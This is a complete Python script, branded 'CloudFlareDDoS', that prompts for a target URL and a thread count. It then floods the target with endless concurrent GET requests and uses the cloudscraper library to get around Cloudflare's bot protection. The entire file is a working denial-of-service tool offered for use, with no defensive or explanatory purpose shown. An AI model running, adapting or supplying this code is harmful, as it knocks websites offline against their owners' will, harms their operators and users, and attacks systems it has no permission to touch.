import cloudscraper
import requests
import threading
from time import sleep

def check_url(url):
    try:
        cloudfare_check_url = requests.Session()
        response = cloudfare_check_url.get(url)
        if response.status_code == 200:
            print("\033[92m root@hurryup:~# The Url İs Valid \033[0m")
        elif response.status_code == 404:
            print("\033[91m root@hurryup:~# The Url İs İnvalid \033[0m")
    except:
        bypass = cloudscraper.create_scraper()
        response2 = bypass.get(url)
        if response2.status_code == 200:
            print("\033[92m root@hurryup:~# The Url İs Valid \033[0m")
        elif response2.status_code == 404:
            print("\033[91m root@hurryup:~# The Url İs İnvalid \033[0m")

count = 0

# ddos cloudfare
def bypass(url, threads):

    r = requests.Session()
    bypass2 = cloudscraper.create_scraper()

    def do_req():
        global count
        while True:
            response = r.get(url)
            count +=1

            print("\033[92m\n" + f"root@hurryup:~# Status Code : {response.status_code} Request Number : {count}" + "\n\033[0m")

            response = bypass2.get(url)
            print("\033[92m\n" + f"root@hurryup:~# Status Code : {response.status_code} Request Number : {count}" + "\n\033[0m")

    list_of_threads = []

    for i in range(int(threads)):
        t = threading.Thread(target=do_req)
        t.daemon = True
        # appending all the threads to the list of threads
        list_of_threads.append(t)

    for i in range(int(threads)):
        #starting the threads
        list_of_threads[i].start()

    for i in range(int(threads)):
        #joining the threads
        list_of_threads[i].join()

print(" ")
print("\033[90m----------------------------CloudFlareDDoS--------------------------------- \033[0m")
print("\033[91m   ________                __________                ____  ____       _____ \033[0m")
print("\033[92m  / ____/ /___  __  ______/ / ____/ /___ _________  / __ \/ __ \____ / ___/ \033[0m")
print("\033[93m / /   / / __ \/ / / / __  / /_  / / __ `/ ___/ _ \/ / / / / / / __ \\__ \  \033[0m")
print("\033[94m/ /___/ / /_/ / /_/ / /_/ / __/ / / /_/ / /  /  __/ /_/ / /_/ / /_/ /__/ /  \033[0m")
print("\033[95m\____/_/\____/\__,_/\__,_/_/   /_/\__,_/_/   \___/_____/_____/\____/____/   \033[0m")
print("\033[96m----------------------------CloudFlareDDoS--------------------------------- \033[0m")
print(" ")

url = input("\033[92m root@hurryup:~# Enter The Target Url : \033[0m")
check_url(url)
sleep(1)

threads = input("\033[92m root@hurryup:~# Enter The Number Of Threads : \033[0m")
bypass(url, threads)
